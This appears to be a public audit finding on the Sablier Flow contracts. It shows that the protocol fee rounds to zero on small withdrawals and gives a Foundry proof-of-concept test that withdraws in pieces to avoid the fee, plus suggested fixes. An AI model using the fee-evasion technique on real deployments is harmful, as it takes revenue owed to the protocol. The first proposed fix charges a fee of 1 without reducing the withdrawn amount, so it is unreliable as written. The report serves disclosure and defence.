## <a id='L-02'></a>L-02. It is possible to avoid paying the `protocolFee` 

_Submitted by [ljj](https://profiles.cyfrin.io/u/undefined), [0xstalin](https://profiles.cyfrin.io/u/undefined), [strapontin](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ljj](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

It is possible to avoid paying the `protocolFee` via withdrawing small amounts of tokens. Although gas fees for transactions would deter users from withdrawing small amounts, considering that the Sablier protocol is supporting any ERC20 token that has less than 19 decimals, this becomes a valid attack vector for tokens with little decimals.

## Vulnerability Details

Sablier admin can implement protocol fees for a token with the `setProtocolFee` function found in the `SablierFlowBase.sol` contract.

```Solidity
    function setProtocolFee(IERC20 token, UD60x18 newProtocolFee) external override onlyAdmin {
        // Check: the new protocol fee is not greater than the maximum allowed.
        if (newProtocolFee > MAX_FEE) {
            revert Errors.SablierFlowBase_ProtocolFeeTooHigh(newProtocolFee, MAX_FEE);
        }

        UD60x18 oldProtocolFee = protocolFee[token];

        // Effects: set the new protocol fee.
        protocolFee[token] = newProtocolFee;

        // Log the change of the protocol fee.
        emit ISablierFlowBase.SetProtocolFee({
            admin: msg.sender,
            token: token,
            oldProtocolFee: oldProtocolFee,
            newProtocolFee: newProtocolFee
        });

        // Refresh the NFT metadata for all streams.
        emit BatchMetadataUpdate({ _fromTokenId: 1, _toTokenId: nextStreamId - 1 });
    }
```

This `protocolFee` is applied when a user calls the `withdraw` function which calls the `_withdraw` in the `SablierFlow.sol` contract.

```Solidity
    function _withdraw(
        uint256 streamId,
        address to,
        uint128 amount
    )
        internal
        returns (uint128 withdrawnAmount, uint128 protocolFeeAmount)
    {
        // rest of the function

        if (protocolFee > ZERO) {
            // Calculate the protocol fee amount and the net withdraw amount.
            (protocolFeeAmount, amount) = Helpers.calculateAmountsFromFee({ totalAmount: amount, fee: protocolFee });

            // Safe to use unchecked because addition cannot overflow.
            unchecked {
                // Effect: update the protocol revenue.
                protocolRevenue[token] += protocolFeeAmount;
            }
        }

        unchecked {
            // Effect: update the aggregate balance.
            aggregateBalance[token] -= amount;
        }

        // Interaction: perform the ERC-20 transfer.
        token.safeTransfer({ to: to, value: amount });

        // rest of the function
    }
```

As seen from this function, the protocolFee that will be applied is calculated in the `calculateAmountsFromFee` function in the `Helpers.sol` contract.

```Solidity
    function calculateAmountsFromFee(
        uint128 totalAmount,
        UD60x18 fee
    )
        internal
        view
        returns (uint128 feeAmount, uint128 netAmount)
    {
        // Calculate the fee amount based on the fee percentage.
        feeAmount = ud(totalAmount).mul(fee).intoUint128();

        // Calculate the net amount after subtracting the fee from the total amount.
        netAmount = totalAmount - feeAmount;
    }
```

Due to the use of [UD60x18 math](https://github.com/PaulRBerg/prb-math/blob/main/src/ud60x18/Math.sol), in low `totalAmount` inputs, the `feeAmount` will return 0. This can be verified by adding the following line in the function. 

```Solidity
console.log("fee amount:", feeAmount);
```

This creates an attack vector where users can withdraw small amounts of tokens (e.g. withdraw 9 tokens at a time when fee is 10%) to avoid paying fees. Tokens with industry standard decimals (decimals >= 6) make this attack vector unlikely as malicious actors would have to pay a lot of gas fees to avoid paying `protocolFee`. However, as specified in the Scope of the audit:

> Any ERC-20 token can be used with Flow as long as it adheres to the following assumptions:

> 1. The total supply of any ERC-20 token remains below $(2^{128} - 1)$, i.e., `type(uint128).max`.
> 2. The `transfer` and `transferFrom` methods of any ERC-20 token strictly reduce the sender's balance by the transfer amount and increase the recipient's balance by the same amount. In other words, tokens that charge fees on transfers are not supported.
> 3. An address' ERC-20 balance can only change as a result of a `transfer` call by the sender or a `transferFrom` call by an approved address. This excludes rebase tokens, interest-bearing tokens, and permissioned tokens where the admin can arbitrarily change balances.
> 4. The token contract does not allow callbacks (e.g., ERC-777 is not supported).

This means that Sablier Flow is expected to support ERC20 tokens with low decimals. Tokens with low decimals make this attack vector very likely to happen as amount of calls needed to make to withdraw full amount while avoiding fees will be low. This amount calculated with the following solidity calculation assuming the `protocolFee` is 10%.&#x20;

```Solidity
uint256 calls = ((tokenAmount * (10 ** decimals) / 9)) + ((tokenAmount * (10 ** decimals)) % 9 > 0 ? 1 : 0);
```

This calculation can also be written as the following math equation once again assuming the `protocolFee` is 10%, where `N` is the amount of calls required, `T` is the amount of tokens and `d` is the amount of decimals.

$N = \lfloor\lfloor T \times 10^d\rfloor \div 9\rfloor + \min(1, (T \times 10^d) \bmod 9)$

As an example, using this calculation, we can find out that in order to withdraw 10 tokens with 0 decimals it would take 2 different calls to withdraw the full amount while avoiding fees, for 10 tokens and 2 decimals 112 different calls. Making tokens with low decimals very susceptible to this attack as it would be profitable for malicious actors to split their withdraw in multiple calls to avoid paying the `protocolFee` and pay less of that amount in gas fees. \
Consider that as the `protocolFee` goes down, amount of tokens that can be withdraw in a single transaction goes up making the attack cost less gas to perform. Even if no tokens with low decimals become widely used, this attack can very well be worth to execute if gas prices keep going down and BTC (widely used token with most value for 1 wei) price goes up.

## Proof of Concept

Add the following test contract in the tests file and run it to observe the vulnerability. In order to run this test, add a `mint` function in the `MockERC20.sol`

```Solidity
pragma solidity >=0.8.22;

import { Test } from "forge-std/src/Test.sol";
import { console } from "forge-std/src/console.sol";
import "../src/SablierFlow.sol";
import "../src/interfaces/IFlowNFTDescriptor.sol";
import "./mocks/ERC20Mock.sol";

// Mock NFT descriptor to satisfy constructor requirements
contract MockNFTDescriptor is IFlowNFTDescriptor {
    function tokenURI(IERC721Metadata, uint256) external pure override returns (string memory) {
        return "test_uri";
    }
}

contract CustomTest is Test {
    SablierFlow private flow;
    ERC20Mock private token;
    ERC20Mock private wbtc;
    MockNFTDescriptor private nftDescriptor;

    address private sender = address(0x1);
    address private recipient = address(0x2);
    address private admin = address(0x3);
    uint128 private amount = 100e18;
    uint256 private streamId;

function setUp() public {
    // Deploy mock tokens and NFT descriptor
    token = new ERC20Mock("MockToken", "MTK", 0);
    wbtc = new ERC20Mock("Wrapped Bitcoin", "WBTC", 8);
    nftDescriptor = new MockNFTDescriptor();

    // Mint initial tokens directly to the sender's address
    token.mint(sender, amount);
    wbtc.mint(sender, amount);

    // Deploy the SablierFlow contract
    flow = new SablierFlow(address(admin), nftDescriptor);

    // Approve the SablierFlow contract to spend the sender's tokens
    vm.startPrank(sender);
    token.approve(address(flow), amount);
    wbtc.approve(address(flow), amount);
    vm.stopPrank();
}
 function testCreateAndDepositAndWithdrawWithFee() public {
     // implement the fee
     UD60x18 newFee = UD60x18.wrap(0.1e18);
     vm.prank(admin);
     flow.setProtocolFee(token, newFee);
  
     // caches
     uint256 decimals = token.decimals();
     uint256 tokenAmount = 10;
     uint128 amountToDeposit = uint128(tokenAmount * (10 ** decimals));

     // create a stream and deposit
     vm.prank(sender);
     streamId = flow.createAndDeposit(sender, recipient, ud21x18(1e18), token, true, amountToDeposit);

     // advance time
     vm.warp(block.timestamp + 10000);

     // calculation
     uint256 calls = ((tokenAmount * (10 ** decimals) / 9)) + ((tokenAmount * (10 ** decimals)) % 9 > 0 ? 1 : 0);
     uint128 withdrawableAmount = flow.withdrawableAmountOf(streamId);

     // recipent withdraw
     vm.startPrank(recipient);
     flow.withdraw(streamId, recipient, 9);
     flow.withdraw(streamId, recipient, 1);
     vm.stopPrank();

     // assertions
     assertEq(calls, 2);
     assertEq(flow.protocolRevenue(token), 0);
     assertEq(token.balanceOf(address(recipient)), withdrawableAmount);
    }
```

## Impact

Likelihood: Low as tokens with such little decimals are not widely used at the moment\
Impact: High as this vulnerability leads to direct loss of funds for the protocol

## Tools Used

Manual review, foundry

## Recommendations

Implement a standard base fee of 1 when `protocolFee > ZERO` but `protocolFeeAmount returns 0`. An example of this is shown below.

```Solidity
    function _withdraw(
        uint256 streamId,
        address to,
        uint128 amount
    )
        internal
        returns (uint128 withdrawnAmount, uint128 protocolFeeAmount)
    {
        // rest of the function

        if (protocolFee > ZERO) {
            // Calculate the protocol fee amount and the net withdraw amount.
            (protocolFeeAmount, amount) = Helpers.calculateAmountsFromFee({ totalAmount: amount, fee: protocolFee });
            if (protocolFeeAmount == 0) protocolFeeAmount = 1;

            // Safe to use unchecked because addition cannot overflow.
            unchecked {
                // Effect: update the protocol revenue.
                protocolRevenue[token] += protocolFeeAmount;
            }
           // rest of the function
        }
```

Alternatively, protocol already reverts when stream's token decimals are greater than 18, protocol must add another check to make sure that the token decimals can not be too little. The amount can be set according to what protocol deems is acceptable (such as 4). An example of this recommendation is shown below.

```Solidity
    function _create(
        address sender,
        address recipient,
        UD21x18 ratePerSecond,
        IERC20 token,
        bool transferable
    )
        internal
        returns (uint256 streamId)
    {
        // Check: the sender is not the zero address.
        if (sender == address(0)) {
            revert Errors.SablierFlow_SenderZeroAddress();
        }

        uint8 tokenDecimals = IERC20Metadata(address(token)).decimals();

        // Check: the token decimals are not greater than 18.
        if (tokenDecimals > 18 || tokenDecimals < 4) {
            revert Errors.SablierFlow_InvalidTokenDecimals(address(token));
        }
       // rest of the function
```
